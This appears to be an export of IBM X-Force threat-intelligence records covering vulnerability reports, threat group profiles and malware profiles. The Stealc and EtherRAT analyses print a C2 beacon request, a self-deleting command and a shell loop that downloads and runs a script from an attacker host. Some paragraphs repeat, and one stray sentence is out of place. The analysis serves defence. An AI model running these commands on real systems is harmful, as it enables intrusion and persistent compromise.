objects.name: Drive-by Compromise Leads To Qilin Ransomware
objects.x_com_ibm_short_description:
During November 2025, IBM X-Force responded to an incident in which the victim observed large amounts of data being exfiltrated from their network. Forensic analysis determined that an end-user accessed a compromised website subsequently installing a backdoor which enabled the threat actor (TA) to gain initial access. Upon entry, the threat actor performed the following:

*   Established persistence
*   Escalated privileges
*   Moved laterally to compromise additional systems
*   Made use of legitimate Windows binaries and other IT software
*   Created new domain admin accounts
*   Cleared system logs
*   Encrypted and exfiltrated data

After examining the tactics, techniques, and procedures observed in this incident, X-Force assesses that the compromised website was part of SocGholish infrastructure and the follow-on threat activity was related to Qilin Ransomware.

objects.name: Vulnerability Report for Anchore Enterprise GraphQL Reports API SQL injection
objects.description: Anchore Enterprise versions before 5.25.1 contain an SQL injection vulnerability in the GraphQL Reports API. An authenticated attacker that is able to access the GraphQL API could execute arbitrary SQL instructions resulting in modifications to the data contained in the Anchore Enterprise database.

objects.name: Vulnerability Report for ZeptoClaw: Path boundary checks bypass via symlink, TOCTOU, and hardlink
objects.description: ZeptoClaw is a personal AI assistant. Prior to 0.7.6, there is a Dangling Symlink Component Bypass, TOCTOU Between Validation and Use, and Hardlink Alias Bypass.

objects.name: Vulnerability Report for Google Chrome buffer overflow
objects.description: Google Chrome is vulnerable to a heap-based buffer overflow, caused by improper bounds checking by Skia. By persuading a victim to visit a specially crafted Web site, a remote attacker could overflow a buffer and execute arbitrary code on the system or cause the application to crash.
objects.x_xfe_remedy: Upgrade to the latest version of Google Chrome (146.0.7680.71 or 146.0.7680.72 or later), available from the Google Chrome Releases Web site. See References.

objects.name: Handala Threat Group Profile
objects.x_com_ibm_short_description:
Handala is a pro-Palestinian, Iran‑aligned hacktivist threat group that emerged in late 2023 following the onset of the Gaza conflict. The group’s activity reflects ideological and geopolitical motivations consistent with Iranian state interests, with targeting that has included Israeli civilian infrastructure, energy organizations in the Gulf region, and Western‑affiliated entities. Its operations focus on generating disruptive and psychological impact.

Handala employs a broad and evolving toolkit, including phishing, custom wiper malware, ransomware‑style extortion, data theft, and hack‑and‑leak activity. Its campaigns consistently feature ideological messaging, inflated or misleading breach claims, and deliberate targeting of life‑critical sectors such as healthcare and energy. The group also focuses campaigns targeting financial services, satellite communications, military-adjacent technology firms, and government entities. Activity escalated significantly after the U.S.–Israeli military campaign known as Operation Epic Fury began on February 28, 2026. Multiple intelligence firms assess Handala as a front or proxy for Iranian state‑sponsored actors—specifically linked to the Ministry of Intelligence and Security (MOIS) through associations with the Banished Kitten / Void Manticore cluster. The group appears to conduct operations from [Starlink](https://x.com/\_CPResearch\_/status/2013349461070586054) IP ranges, using them to probe externally facing apps looking for weak credentials and misconfigurations.

objects.name: Vulnerability Report for Command Injection Vulnerability in Telnet CLI on TP-Link TL-MR6400
objects.description: A command injection vulnerability has been identified in the Telnet command-line interface (CLI) of TP-Link TL-MR6400 v5.3. This issue is caused by insufficient sanitization of data processed during specific CLI operations. An authenticated attacker with elevated privileges may be able to execute arbitrary system commands. Successful exploitation may lead to full device compromise, including potential loss of confidentiality, integrity, and availability.

objects.name: Stealc Malware Profile
objects.description:
# Summary

Stealc is an information-stealing malware that targets Microsoft Windows systems. It primarily focuses on collecting sensitive data from a range of applications, including browsers, file transfer programs, messaging platforms and cryptocurrency wallets.

It first downloads configuration details tailored to each type of targeted data. These configurations contain specific instructions, indicating which browsers, cryptocurrency wallets, files, among others, to target. Stealc can identify and steal files with a specified extension located within a designated directory, as specified by the configuration data received from its command-and-control (C2) server. Once the data collection is complete, Stealc bundles the stolen information and transmits it to the C2 server.

Stealc targets a variety of browsers including common browsers such as Chrome, Firefox, Opera, and Edge as well as other browsers based on Chromium and Opera. In addition to data theft, Stealc can enumerate system information, take a screenshot and is also able to download and execute further malicious payloads after data collection and transmission. This additional payload execution forms part of a Malware as a Service (MaaS) model, with the particular payload selected based on the affiliate operating the StealC panel.

To protect its internal operations, Stealc stores crucial strings, such as its C2 URL and other necessary strings, in an encrypted format. During runtime, it employs the RC4 algorithm with a hardcoded key to decrypt these strings. Moreover, Stealc dynamically links required libraries, including Windows API functions and contains an embedded payload to facilitate data extraction via Google Chrome v20 application-bound encryption.

### Threat Type

  - Infostealer

### Threat Group

  - Unknown

# Stealc V1

Stealc is an information stealer targeting Microsoft Windows systems. Stealc is written in C and is compiled as a 32-bit portable executable.

Stealc is designed to evade detection and analysis. Stealc performs several steps including decrypting its configuration and other strings, resolving API functions, and performing environment checks prior to performing any suspicious behavior including communicating with its C2 server or collecting sensitive data.

Stealc stores its strings encrypted with RC4 and encoded with Base64 in multiple functions. The RC4 key is stored in the first function to decrypt strings. This function mainly decrypts Windows API function names and other strings that are needed to perform its environment checks. Another function decrypts additional strings including the C2 address and other strings needed to extract data (e.g., file paths, sql queries, registry keys, etc.) and more Win API function names after it has completed its environment checks to avoid detection.

Stealc resolves its API functions dynamically by manually loading kernel32.dll by walking the PEB and loaded module list then using it to resolve GetProcAddress() then resolve each additional Windows function it needs using *GetProcAddress()* and *LoadLibraryA()* as needed to load additional libraries.

#### Environment checks

Stealc calls *GetSystemInfo()* to determine the number of processors reported by Windows and exits if the number of processors is less than **2** .

Stealc performs a check to determine if its process memory is writable. It gets a handle to the current process by calling *GetCurrentProcess()* then attempts to allocate a block of memory with read/write/execute permissions in the current process by calling *VirtualAllocExNuma()* and exits if it is unable to do so.

Stealc checks if the amount of physical memory is less than a configured amount and exits if does not meet its requirement.

Stealc performs a check to see if it is running in the emulation layer of Microsoft Defender by retrieving the computer name and logged in user's name and compares them to configured strings. Stealc will exit if the computer name is **HAL9TH** and the user name is **JohnDoe** .

Stealc calls *GetUserDefaultLangID()* to identify the language that the system is configured to use then exits if it returns any of the following codes:

  - 1049 (ru-RU) Russia
  - 1058 (uk-UA) Ukraine
  - 1059 (be-BY) Belarus
  - 1087 (kk-KZ) Kazakhstan
  - 1091 (uz-Latn-UZ) Uzbekistan

Finally, Stealc checks the current date and compares against a configured date. Stealc exits if the configured date has already past.

#### C2

Stealc communicates with a C2 server by sending an HTTP POST request to its configured C2 URL. C2 requests are sent in the body of POST requests in a multipart form. Stealc will send a hardware ID and build identifier in its beacon to its C2 server. The following is an example of a C2 beacon:

``` 
POST /40d570f44e84a454.php HTTP/1.1
Content-Type: multipart/form-data; boundary=----GCBFBGCGIJKJJKFIDBFC
Host: 185.172.128.24
Content-Length: 213
Connection: Keep-Alive
Cache-Control: no-cache

------GCBFBGCGIJKJJKFIDBFC
Content-Disposition: form-data; name="hwid"

1DD46D741AAB69161091
------GCBFBGCGIJKJJKFIDBFC
Content-Disposition: form-data; name="build"

default6
------GCBFBGCGIJKJJKFIDBFC--

```

Stealc expects to receive a Base64 encoded string that when decoded contains a pipe delimited list. The first field in the list contains a hash that is used as a token for subsequent communication. However, the C2 server may send back a response of **block** encoded as a Base64 string. Stealc will exit if it receives a response to block. The following is a response containing a block code:

``` 
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Fri, 19 Jan 2024 19:40:29 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 8
Connection: keep-alive

YmxvY2s=

```

Stealc will send additional POST requests to its C2 server containing a command to request configuration data for each type of data that it collects (e.g., *browsers*, *files*, etc.).

The same URL (similar to the one below) is used to beacon and request configurations for its data theft modules:

``` 
http[:]//185.172.128[.]24/40d570f44e84a454.php

```

Stealc will also send a POST request to retrieve DLLs used to extract data from various data sources using a URL similar to the following:

``` 
http[:]//185.172.128[.]24/2a7743b8bbd7e4a7/sqlite3.dll

```

Stealc will download the following DLLs used to access data and save them to `C:\\ProgramData\`:

  - freebl3.dll
  - mozglue.dll
  - msvcp140.dll
  - nss3.dll
  - softokn3.dll
  - vcruntime140.dll
  - sqlite3.dll

Stealc loads the DLLs as needed only importing specific functions that it needs for its operations.

#### Targeted data

Stealc performs a similar process for each type of data that it collects. It will request the configuration data for each type of data, collect the data into a separate file, then send it to the C2 server in a multipart form in the body of a POST request.

Stealc will collect the following data as part of a system profile then send it to its C2 server. The data is saved to a file **system\_info.txt** prior to being sent.

  - IP address and network information
  - Country ISO
  - System summary
  - Hardware ID
  - Volume serial number
  - Operating System
  - System architecture
  - Flag indicating if Stealc is running in a Wow64 subsystem
  - User name
  - Computer name
  - Current local time
  - Timezone
  - User language setting
  - Keyboard locale setting
  - Flag indicating if the system is a laptop computer
  - Process name
  - Processor name
  - Number of cores
  - Number of processors
  - Amount of system RAM
  - Display resolution
  - Flag indicating if a GPU installed
  - User Agent
  - Installed applications
  - User account list
  - Process list

Steal collects data for several browsers including Chrome, Edge, and other Chromium-based browser as well as Firefox, Opera, and Opera-based browsers by sending a request for configuration with the **browsers** command. The specific browsers to extract data from are contained in the configuration data received from the C2 server. Stealc steals the following types of browser data:

  - cookies
  - logins
  - history
  - stored credit cards
  - autofill/form history

Stealc will similarly send commands to retrieve configuration data then extract sensitive data from the following applications:

  - Browser extensions
  - Cryptocurrency wallets
  - Filezilla
  - Discord
  - Steam
  - Telgram
  - Tox
  - Pidgin
  - Outlook

Stealc will also collect files contained in a specified directory with file extensions listed in the configuration received from the **files** command.

Stealc will also take a screenshot of the desktop and save it to **screenshot.jpg** then send it to its C2 server.

In addition to stealing sensitive data, Stealc has the ability to download and execute a payload used to infect the system with additional malware. Stealc will download either a DLL or EXE file from a URL contained in the configuration response received after it sends the **done** command to the C2 server. Stealc will call *ShellExecuteExA()* to execute an EXE payload file or rundll32.exe to load the payload if it is a DLL using the appropriate command below:

``` 
C:\Windows\system32\cmd.exe /c start %TEMP%\<downloaded_exe_file>
C:\Windows\system32\cmd.exe C:\Windows\system32\rundll32.dll %TEMP%\<downloaded_dll_file>

```

Finally, Stealc will attempt to remove any traces of its execution on the system by executing the following cmd.exe command using *ShellExecuteExA()* to remove itself and any of the DLL files that it downloaded:

``` 
C:\Windows\system32\cmd.exe /c timeout /t 5 & del /f /q <Stealc_exe_path> & del "C:\ProgramData\*.dll" & exit

```

# Stealc V2

In March 2025 Stealc V2 was introduced, adding several updates. The most noticeable improvements are:

  - C2 communication via RC4-encrypted JSON
  - Support for Google Chrome v20 application-bound encryption via an embedded PE payload which is injected into the browser process
  - Additional support for PowerShell and MSI secondary payloads

extension-definition--554f89d8-7f76-4592.summary: Stealc is an information-stealing malware that targets Microsoft Windows systems. It primarily focuses on collecting sensitive data from a range of applications, including browsers, file transfer programs, messaging platforms and cryptocurrency wallets. It first downloads configuration details tailored to each type of targeted data. These configurations contain specific instructions, indicating which browsers, cryptocurrency wallets, files, among others, to target. Stealc can identify and steal files with a specified extension located within a designated directory, as specified by the configuration data received from its command-and-control (C2) server. Once the data collection is complete, Stealc bundles the stolen information and transmits it to the C2 server.Stealc targets a variety of browsers including common browsers such as Chrome, Firefox, Opera, and Edge as well as other browsers based on Chromium and Opera. In addition to data theft, Stealc can enumerate system information, take a screenshot and is also able to download and execute further malicious payloads after data collection and transmission. This additional payload execution forms part of a Malware as a Service (MaaS) model, with the particular payload selected based on the affiliate operating the StealC panel.To protect its internal operations, Stealc stores crucial strings, such as its C2 URL and other necessary strings, in an encrypted format. During runtime, it employs the RC4 algorithm with a hardcoded key to decrypt these strings. Moreover, Stealc dynamically links required libraries, including Windows API functions and contains an embedded payload to facilitate data extraction via Google Chrome v20 application-bound encryption.

objects.x_com_ibm_short_description:
Stealc is an information-stealing malware that targets Microsoft Windows systems. It primarily focuses on collecting sensitive data from a range of applications, including browsers, file transfer programs, messaging platforms and cryptocurrency wallets.

It first downloads configuration details tailored to each type of targeted data. These configurations contain specific instructions, indicating which browsers, cryptocurrency wallets, files, among others, to target. Stealc can identify and steal files with a specified extension located within a designated directory, as specified by the configuration data received from its command-and-control (C2) server. Once the data collection is complete, Stealc bundles the stolen information and transmits it to the C2 server.

Stealc targets a variety of browsers including common browsers such as Chrome, Firefox, Opera, and Edge as well as other browsers based on Chromium and Opera. In addition to data theft, Stealc can enumerate system information, take a screenshot and is also able to download and execute further malicious payloads after data collection and transmission. This additional payload execution forms part of a Malware as a Service (MaaS) model, with the particular payload selected based on the affiliate operating the StealC panel.

To protect its internal operations, Stealc stores crucial strings, such as its C2 URL and other necessary strings, in an encrypted format. During runtime, it employs the RC4 algorithm with a hardcoded key to decrypt these strings. Moreover, Stealc dynamically links required libraries, including Windows API functions and contains an embedded payload to facilitate data extraction via Google Chrome v20 application-bound encryption.

objects.name: Vulnerability Report for undici is vulnerable to Unhandled Exception in undici WebSocket Client Due to Invalid server_max_window_bits Validation
objects.description: The undici WebSocket client is vulnerable to a denial-of-service attack due to improper validation of the server_max_window_bits parameter in the permessage-deflate extension. When a WebSocket client connects to a server, it automatically advertises support for permessage-deflate compression. A malicious server can respond with an out-of-range server_max_window_bits value (outside zlib's valid range of 8-15). When the server subsequently sends a compressed frame, the client attempts to create a zlib InflateRaw instance with the invalid windowBits value, causing a synchronous RangeError exception that is not caught, resulting in immediate process termination.

objects.name: Vulnerability Report for Cross-Origin File Exfiltration via CORS Misconfiguration + Path Traversal in TinaCMS
objects.description: Tina is a headless content management system. Prior to 2.1.8 , the TinaCMS CLI dev server combines a permissive CORS configuration (Access-Control-Allow-Origin: *) with the path traversal vulnerability (previously reported) to enable a browser-based drive-by attack. A remote attacker can enumerate the filesystem, write arbitrary files, and delete arbitrary files on developer's machines by simply tricking them into visiting a malicious website while tinacms dev is running.

This affects the function rememberMeManager of the file src/main/java/com/perfree/config/ShiroConfig.java of the component Apache Shiro RememberMe. Performing a manipulation results in use of hard-coded cryptographic key.

objects.name: Hive0138 Threat Group Profile
objects.x_com_ibm_short_description: Hive0138 is an email spammer that IBM X-Force has been tracking since at least September 2023. This spammer's campaigns have been less frequent than other tracked spammers, last observed in May 2024. While the majority of Hive0138 campaigns have delivered Bumblebee or Foret-crypted Silver, we have also observed their campaigns delivering DarkGate, ParallaxRAT, and Botyara.

objects.name: Vulnerability Report for Google Chrome security bypass
objects.description: Google Chrome could allow a remote attacker to bypass security restrictions, caused by insufficient policy enforcement in Extensions. By persuading a victim to visit a specially crafted Web site, an attacker could exploit this vulnerability to bypass security restrictions.

objects.name: Vulnerability Report for PyJWT accepts unknown `crit` header extensions (RFC 7515 §4.1.11 MUST violation)
objects.description: PyJWT is a JSON Web Token implementation in Python. Prior to 2.12.0, PyJWT does not validate the crit (Critical) Header Parameter defined in RFC 7515 §4.1.11. When a JWS token contains a crit array listing extensions that PyJWT does not understand, the library accepts the token instead of rejecting it. This violates the MUST requirement in the RFC.

objects.name: China-nexus Threat Actor Targets Persian Gulf Region With PlugX
objects.x_com_ibm_short_description:
A recent cyber threat analysis has uncovered a sophisticated attack chain themed around geopolitical tensions in the Middle East. The attack, identified in early March 2026, begins with a ZIP archive containing a malicious Windows shortcut (LNK) file. Upon execution, this LNK file downloads a Compiled HTML Help (CHM) file from a threat actor-controlled server, which then deploys a multi-stage payload culminating in the installation of a PlugX backdoor variant. The attack employs a decoy PDF with images of missile strikes and Arabic text referencing Iranian missile strikes against a US base in Bahrain, likely to lure victims into opening the malicious files.The attack chain involves multiple stages, including the use of a shellcode loader and heavily obfuscated shellcode to evade detection. The shellcode loader establishes persistence and decrypts the shellcode using a custom XOR algorithm. The PlugX backdoor, once deployed, is capable of executing a variety of commands, including collecting system information, updating configurations, and utilizing plugins for various malicious activities. The backdoor also employs reflective DLL injection and anti-forensics techniques to evade memory forensics solutions. The PlugX configuration is decrypted in two stages, revealing details such as extensions to target, date filters, C2 IP addresses, and persistence paths.

*Disclaimer: This article is part of X-Force OSINT Advisories automated collection to enable faster integration of open-source articles to client environments. All credit and copyright goes to the original authors.*

objects.name: CyberAv3ngers Threat Group Profile
objects.x_com_ibm_short_description:
CyberAv3ngers is an Iranian state-linked cyber threat group operating as a persona for cyber elements of the Islamic Revolutionary Guard Corps (IRGC), specifically the IRGC Cyber-Electronic Command [(IRGC-CEC)](https://rewardsforjustice.net/rewards/cyberav3ngers/). The group has been active since at least 2020, with operations initially concentrated against Israeli interests before expanding to include [targets](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-335a) across the United States, Europe, and beyond. Their activities are directly tied to geopolitical events and Iranian state objectives, making them a [retaliatory](https://www.levelblue.com/blogs/spiderlabs-blog/levelblue-spiderlabs-breaks-down-the-role-of-cyber-operations-taken-in-the-iran-crisis) actor with an operational tempo escalating in response to military or political provocations against Iran.

The group is also closely linked to the "APT IRAN" channel and persona. APT IRAN is a pro-Iranian hacktivist collective, in which CyberAv3ngers shares significant overlap, thus is widely considered to be a [rebranding](https://lab52.io/blog/black-industry-irgc-linked-offensive-ot-framework/) of CyberAv3ngers. Furthermore, a newer channel "Cyber4vengers" emerged in January 2026 following the deletion of the APT IRAN Telegram channel, suggesting a continued operational evolution. Of note, the group APT IRAN is known for their hack-and-leak operations, specifically [claiming](https://x.com/MonThreat/status/2028444181740376297) responsibility for the cyber-sabotage of Jordan’s critical infrastructure.

objects.name: Vulnerability Report for @backstage/plugin-auth-backend: OAuth redirect URI allowlist bypass
objects.description: Backstage is an open framework for building developer portals. Prior to 0.27.1, the experimental OIDC provider in @backstage/plugin-auth-backend is vulnerable to a redirect URI allowlist bypass. Instances that have enabled experimental Dynamic Client Registration or Client ID Metadata Documents and configured allowedRedirectUriPatterns are affected. A specially crafted redirect URI can pass the allowlist validation while resolving to an attacker-controlled host. If a victim approves the resulting OAuth consent request, their authorization code is sent to the attacker, who can exchange it for a valid access token. This requires victim interaction and that one of the experimental features is explicitly enabled, which is not the default.

objects.name: Blind Eagle Threat Group Profile
objects.x_com_ibm_short_description: Blind Eagle is a threat group that engages in both espionage and cybercrime, primarily targeting organizations in Colombia and other Latin American countries. Active since [2018](https://research.checkpoint.com/2025/blind-eagle-and-justice-for-all/#:~:text=also%20known%20as,and%20cybercrime), this Advanced Persistent Threat (APT) group focuses on government institutions, financial organizations, and critical infrastructure. The group has long been suspected to originate from South America, with operating timezone identified as UTC-5. Blind Eagle is known for employing sophisticated social engineering tactics, using phishing emails with malicious attachments or links to gain initial access to target systems, and their malware arsenal includes commodity Remote Access Trojans (RATs) such as [NjRAT](https://opencti.intsum.ibm.com/dashboard/analyses/reports/60311517-f49a-4762-80f0-4979af6674dd), AsyncRAT, and Remcos.

objects.name: Vulnerability Report for Uptime Kuma is Missing Authorization Checks on Ping Badge Endpoint, Leaks Ping times of monitors without needing to be on a status page
objects.description: From 2.0.0 to 2.1.3, the GET /api/badge/:id/ping/:duration? endpoint in server/routers/api-router.js does not verify that the requested monitor belongs to a public group. All other badge endpoints check AND public = 1 in their SQL query before returning data. The ping endpoint skips this check entirely, allowing unauthenticated users to extract average ping/response time data for private monitors.

objects.name: Vulnerability Report for Vulnerability in the OpenSSH GSSAPI delta included in various Linux distributions
objects.description: Vulnerability in the OpenSSH GSSAPI delta included in various Linux distributions. This vulnerability affects the GSSAPI patches added by various Linux distributions and does not affect the OpenSSH upstream project itself. The usage of sshpkt_disconnect() on an error, which does not terminate the process, allows an attacker to send an unexpected GSSAPI message type during the GSSAPI key exchange to the server, which will call the underlying function and continue the execution of the program without setting the related connection variables. As the variables are not initialized to NULL the code later accesses those uninitialized variables, accessing random memory, which could lead to undefined behavior.
objects.x_xfe_remedy: The recommended workaround is to use ssh_packet_disconnect() instead, which does terminate the process.

objects.name: JunkFiction Malware Profile
objects.x_com_ibm_short_description:
JunkFiction is a malware family linked to the Interlock ransomware group. JunkFiction primarily operates as a crypter/loader, however a downloader variant of the malware has also been observed. JunkFiction Loader is primarily used to crypt payloads linked to the Interlock group, such as Supper Backdoor, Mallard Downloader, PortStarter, Berserk Stealer, and Interlock Ransomware. JunkFiction Loader dates back to around May 2024, and the downloader variant was first seen in September 2024.

JunkFiction Downloader uses Powershell to download and execute an installer for an application such as Chrome or MSTeams. In most cases the downloaded binary appears to be a genuine installer, and this behaviour serves as a smokescreen for JunkFiction's other activities. Whilst the application installer is executing, JunkFiction gathers basic system information and sends it via TCP to its C2. The C2 may then choose to respond with a malicious payload file which JunkFiction drops to the **%Temp%** directory and executes.

objects.name: Vulnerability Report for Tinyauth vulnerable to TOTP/2FA bypass via OIDC authorize endpoint
objects.description: Tinyauth is an authentication and authorization server. Prior to 5.0.3, the OIDC authorization endpoint allows users with a TOTP-pending session (password verified, TOTP not yet completed) to obtain authorization codes. An attacker who knows a user's password but not their TOTP secret can obtain valid OIDC tokens, completely bypassing the second factor.

objects.name: HijackLoader used to Load DCRat
objects.description:
# X-Force Flash Report

**Serial: 2025-INT00018015  | Date:**  **2025-12-22** **| TLP: AMBER**

# HijackLoader used to Load DCRat

# Summary

In October 2025, IBM X-Force reported on a threat actor delivering the [PureHVNC](https://opencti.intsum.ibm.com/dashboard/analyses/reports/d8b54544-b61c-4322-b1dc-8940ca2f4dd8) RAT to users in Colombia through emails containing [Hijackloader](https://opencti.intsum.ibm.com/dashboard/analyses/reports/d5de0435-7022-4be4-aff2-af6c6caf9e2c). Since that time, X-Force has observed additional campaigns using Hijackloader to deliver another commodity RAT, [DCRat](https://opencti.intsum.ibm.com/dashboard/analyses/reports/0a7ba940-f09c-43d8-9112-025458de1433). Although these factors should not be used as attribution alone, the observed similarities between the emails delivering PureHVNC and DCRat including the themes, targets, and context, as well as some infrastructure overlap indicate that it is highly likely that the same actor(s) are responsible for both campaigns delivering PureHVNC and DCRat.

# Details

Between August and October 2025, X-Force observed several emails targeting likely Colombian, Spanish-speaking individuals with themes related to official correspondence from Colombia's Office of Attorney General. The emails entice the user to download an "official document" from the Judicial Information System, which starts the infection chain of executing a Hijackloader executable that leads to the PureHVNC RAT. Since at least that time, similarly-structured emails have surfaced delivering DCRat. The emails include malicious Scalable Vector Graphics (SVG) attachments containing obfuscated JavaScript. When the JavaScript is executed, it decodes and launches a malicious HTML page directing the user to download a document. When clicked, a secondary page loads which shows the user a password. During this time, the JavaScript drops a password-protected RAR file, which the user must open using the supplied password from the secondary page. The downloaded RAR file contains additional files, one being a Hijackloader file used to deploy DCRat.

Email themes:

  - *Priority medical services - Review of required information on the official platform* (this theme is odd because the user is still redirected to a fake website mimicking Colombia's Office of Attorney General)
  - *Submission of a technical and legal report for analysis by the recipient*
  - *Submission of a legal report on outstanding obligations*
  - *Submission of a summary of actions and supporting documents for the procedure*

In October 2025, IBM X-Force reported on a threat actor delivering the PureHVNC RAT to users in Colombia through emails containing Hijackloader. Since that time, X-Force has observed additional campaigns using Hijackloader to deliver another commodity RAT, DCRat. Although these factors should not be used as attribution alone, the observed similarities between the emails delivering PureHVNC and DCRat including the themes, targets, and context, as well as some infrastructure overlap indicate that it is highly likely that the same actor(s) are responsible for both campaigns delivering PureHVNC and DCRat.

In October 2025, IBM X-Force reported on a threat actor delivering the PureHVNC RAT to users in Colombia through emails containing Hijackloader. Since that time, X-Force has observed additional campaigns using Hijackloader to deliver another commodity RAT, DCRat. Although these factors should not be used as attribution alone, the observed similarities between the emails delivering PureHVNC and DCRat including the themes, targets, and context, as well as some infrastructure overlap indicate that it is highly likely that the same actor(s) are responsible for both campaigns delivering PureHVNC and DCRat.

objects.name: Vulnerability Report for Authenticated RCE via unsanitized compression_algorithm
objects.description: An improper sanitization of the compression_algorithm parameter in Canonical LXD allows an authenticated, unprivileged user to execute commands as the LXD daemon on the LXD server via API calls to the image and backup endpoints.

objects.name: Vulnerability Report for Memory Allocation with Excessive Size Value vulnerability in Trane Tracer SC, Tracer SC+, and Tracer Concierge
objects.description: A Memory Allocation with Excessive Size Value vulnerability in Trane Tracer SC, Tracer SC+, and Tracer Concierge could allow an unauthenticated attacker to cause a denial-of-service condition.
objects.x_xfe_remedy: Trane has released the following versions of Tracer SC+ for users to upgrade to: CVE-2026-28253: Tracer SC+ version v6.30.2313

objects.name: Vulnerability Report for Weak Entropy for Authentication Cookies
objects.description: HMS Networks Ewon Flexy with firmware before 15.0s4, Cosy+ with firmware 22.xx before 22.1s6, and Cosy+ with firmware 23.xx before 23.0s3 have weak entropy for authentication cookies, allowing an attacker with a stolen session cookie to find the user password by brute-forcing an encryption parameter.

objects.name: Vulnerability Report for Raw exposure of database statements in Hyperterse MCP search tool
objects.description: Hyperterse is a tool-first MCP framework for building AI-ready backend surfaces from declarative config. Prior to v2.2.0, the search tool allows LLMs to search for tools using natural language. While returning results, Hyperterse also returned the raw SQL queries, exposing statements which were supposed to be executed under the hood, and protected from being displayed publicly.

objects.name: Vulnerability Report for Use of Hard-coded Credentials vulnerability in Trane Tracer SC, Tracer SC+, and Tracer Concierge
objects.description: A Use of Hard-coded, Security-relevant Constants vulnerability in Trane Tracer SC, Tracer SC+, and Tracer Concierge could allow an attacker to disclose sensitive information and take over accounts.
objects.x_xfe_remedy: Trane has released the following versions of Tracer SC+ for users to upgrade to: CVE-2026-28255: Trane has implemented enhanced cloud security controls to mitigate this vulnerability.

objects.name: Vulnerability Report for Tinyauth's OIDC authorization codes are not bound to client on token exchange
objects.description: Tinyauth is an authentication and authorization server. Prior to 5.0.3, the OIDC token endpoint does not verify that the client exchanging an authorization code is the same client the code was issued to. A malicious OIDC client operator can exchange another client's authorization code using their own client credentials, obtaining tokens for users who never authorized their application.

objects.name: React2Shell (CVE‑2025‑55182): Operational Impact and Post‑Exploitation Evolution
objects.x_com_ibm_short_description: IBM X-Force has been closely monitoring activity associated with React2Shell, a recently disclosed a critical remote code execution (RCE) vulnerability, which is being tracked as [CVE-2025-55182](https://nvd.nist.gov/vuln/detail/CVE-2025-55182) (CVSS score: 10.0) and is affecting React Server Components (RSC) and related frameworks such as Next.js. Following the public disclosure on December 3, 2025, multiple threat actors–ranging from opportunistic cybercriminals to state-sponsored threat groups–have aggressively been exploiting this flaw to run code on vulnerable servers without authentication. Recent scanning [data](https://thehackernews.com/2025/12/react2shell-vulnerability-actively.html) also shows the scale of global exposure, with well over one hundred thousand internet‑facing systems still running vulnerable code. Early reports suggested post exploitation payloads delivering cryptominers and webshells. However, more recent activity has indicated that adversaries are using React2Shell to deploy more advanced Linux-based implants, specifically to install KSWAPDOOR, a sophisticated Linux remote access trojan (RAT) that also operates as a [backdoor](https://thehackernews.com/2025/12/react2shell-vulnerability-actively.html), capable of stealthy persistence, defense evasion, encrypted C2, and lateral movement. Its emergence signals an escalation in the use of React2Shell from short‑term, financially motivated compromise toward deeper, more resistant intrusions aimed at maintaining access and expanding within Linux‑based environments. As a result, React2Shell should no longer be viewed solely as a high‑volume RCE vulnerability but as an increasingly critical operational tool for advanced post‑exploitation.

objects.name: Vulnerability Report for Postal has HTML injection / XSS in message view
objects.description: Postal is an open source SMTP server. Postal versions less than 3.3.5 had a HTML injection vulnerability that allowed unescaped data to be included in the admin interface. The primary way for unescaped data to be added is via the API's "send/raw" method. This could allow arbitrary HTML to be injected in to the page which may modify the page in a misleading way or allow for unauthorised javascript to be executed.

objects.name: Vulnerability Report for Google Chrome code execution
objects.description: Google Chrome could allow a remote attacker to execute arbitrary code on the system, caused by a use-after-free in WindowDialog. By persuading a victim to visit a specially crafted Web site, an attacker could exploit this vulnerability to execute arbitrary code on the system.
objects.x_xfe_remedy: Upgrade to the latest version of Google Chrome (146.0.7680.71 or 146.0.7680.72 or later), available from the Google Chrome Releases Web site. See References.

objects.name: EtherRAT Malware Profile
objects.description:
# Summary

EtherRAT is a Linux-based implant that uses Ethereum [smart contracts](https://ethereum.org/developers/docs/smart-contracts/) for its C2 resolution. This technique is sometimes referred to as *EtherHiding* where the blockchain is used to retrieve payloads. EtherRAT is delivered by exploiting the *React2Shell* remote code execution (RCE) vulnerability described in [CVE-2025-55182](https://nvd.nist.gov/vuln/detail/CVE-2025-55182). Multiple payloads have been deployed via this vulnerability, however, EtherRAT is the focus of this report.

EtherRAT employs multiple persistence mechanisms, can self-update, executes arbitrary Node.js code and commands. Unlike other payloads delivered through the React2Shell vulnerability, it does not target cryptocurrency wallets or steal credentials; its primary objective is to achieve long-term persistence.

### Threat Type

  - Malware

### Threat Group

  - N/A

# Analysis Details

#### Initial Stage

Exploiting the React2Shell remote code execution vulnerability allows a threat actor to run arbitrary code. In this example, the attacker initiates an infection chain that installs EtherRAT. Below is an example of a command reportedly used in the attack.

This command decodes and executes a base64-encoded payload.

``` 
sh -c echo <base64>|base64 -d|bash

```

The decoded payload is a downloader shell script that obtains a installer shell script, **gfdsgsdfhfsd\_ghsfdgsfdgsdfg.sh** , from `hxxp://193.24.123[.]68:3001` and executes it. The downloader attempts three methods (curl, wget and python) to download the installer.

``` 
while :; do 
  (curl -sL hxxp://193.24.123[.]68:3001/gfdsgsdfhfsd_ghsfdgsfdgsdfg.sh -o ./s.sh 2>/dev/null || \
   wget -qO ./s.sh hxxp://193.24.123[.]68:3001/gfdsgsdfhfsd_ghsfdgsfdgsdfg.sh 2>/dev/null || \
   python3 -c "import urllib.request as u;open('./s.sh','wb').write(u.urlopen('hxxp://193.24.123[.]68:3001/gfdsgsdfhfsd_ghsfdgsfdgsdfg.sh').read())") && \
  [ -s ./s.sh ] && chmod +x ./s.sh && ./s.sh && break
  sleep 300
done

```

#### Installer (gfdsgsdfhfsd\_ghsfdgsfdgsdfg.sh)

Upon execution, the installer **gfdsgsdfhfsd\_ghsfdgsfdgsdfg.sh** makes the hidden directory **$HOME/.local/share/.05bf0e9b/.4dai8ovb** and proceeds to download Node.js installations from legitimate Node.js download URLs. The installer attempts to install the *XZ* version if the *GZ* version fails to install. The node installation is saved to the hidden directory.

``` 
https://nodejs.org/dist/v20.10.0/node-v20.10.0-linux-x64.tar.gz
https://nodejs.org/dist/v20.10.0/node-v20.10.0-linux-x64.tar.xz

```

